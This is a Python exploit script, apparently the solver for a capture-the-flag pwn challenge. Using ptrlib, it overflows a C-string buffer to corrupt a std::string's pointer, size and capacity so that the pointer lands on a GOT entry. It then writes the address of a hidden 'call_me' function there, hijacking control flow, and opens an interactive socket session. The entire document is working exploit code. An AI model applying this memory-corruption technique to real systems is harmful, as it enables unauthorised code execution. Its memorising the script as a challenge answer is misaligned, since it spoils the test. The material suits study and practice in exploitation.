import os
from ptrlib import *

HOST = os.getenv("HOST", "localhost")
PORT = os.getenv("PORT", "9003")

def set_cstr(data):
    assert is_cin_safe(data)
    sock.sendlineafter("choice: ", "1")
    sock.sendlineafter("c_str: ", data)
def set_str(data):
    assert is_cin_safe(data)
    sock.sendlineafter("choice: ", "3")
    sock.sendlineafter("str: ", data)

elf = ELF("../distfiles/chall")
#sock = Process("../distfiles/chall")
sock = Socket(HOST, int(PORT))

payload  = b'A'*0x20
# std::string pointer --> cin@got
payload += p64(elf.got('_ZNSolsEPFRSoS_E'))
# std::string size --> 0x8
payload += p64(8)
# std::string capacity --> 0x8
payload += p64(8)

set_cstr(payload)
set_str(p64(elf.symbol('_ZN4Test7call_meEv'))) # AAW
sock.sendlineafter("choice: ", "x")

sock.interactive()
